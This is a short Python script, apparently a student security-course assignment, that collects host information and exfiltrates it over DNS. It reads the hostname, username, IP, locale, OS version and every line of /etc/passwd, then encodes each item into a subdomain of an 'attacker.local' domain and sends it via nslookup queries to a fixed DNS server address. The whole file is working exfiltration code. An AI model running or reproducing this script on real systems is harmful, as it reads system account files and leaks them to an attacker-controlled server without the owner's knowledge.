#Fadi Nujedat ,  Ron Amsalem
#214766339 , 326029600
import os
import platform
import socket
import getpass
import subprocess

# ===== CONFIGURATION =====
DNS_SERVER_DOMAIN = "attacker.local"   # domain controlled by the attacker
SERVER_IP = "10.11.0.63"           # bind9 server IP

# ===== STAGE 1: Gather system info =====
def gather_info():
    info = []

    # Hostname
    try:
        hostname = socket.gethostname()
        info.append(f"hostname_{hostname}")
    except Exception as e:
        info.append(f"hostname_error_{str(e)}")

    # /etc/passwd content
    try:
        with open("/etc/passwd", "r") as f:
            lines = f.readlines()
            for line in lines:
                info.append(f"passwd_{line.strip()}")
    except Exception as e:
        info.append(f"passwd_error_{str(e)}")

    # Username
    info.append(f"user_{getpass.getuser()}")

    # IP
    try:
        ip = socket.gethostbyname(socket.gethostname())
        info.append(f"ip_{ip}")
    except Exception as e:
        info.append(f"ip_error_{str(e)}")

    # Locale
    try:
        locale_out = subprocess.check_output(["locale"], stderr=subprocess.DEVNULL).decode()
        for line in locale_out.strip().split("\n"):
            info.append(f"locale_{line.strip()}")
    except Exception as e:
        info.append(f"locale_error_{str(e)}")

    # OS version
    info.append(f"os_{platform.platform()}")

    return info


# ===== STAGE 2: Send via DNS =====
def send_via_dns(data_list):
    for i, item in enumerate(data_list):
        # sanitize to DNS-safe
        clean = item.replace(" ", "_").replace(".", "-").replace(":", "-").replace("/", "_")
        query = f"www.{clean}.{DNS_SERVER_DOMAIN}"
        print(f"[>] Sending: {query}")
        try:
            subprocess.call(["nslookup", query, SERVER_IP],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
        except:
            pass

# ===== MAIN =====
if __name__ == "__main__":
    info = gather_info()
    send_via_dns(info)
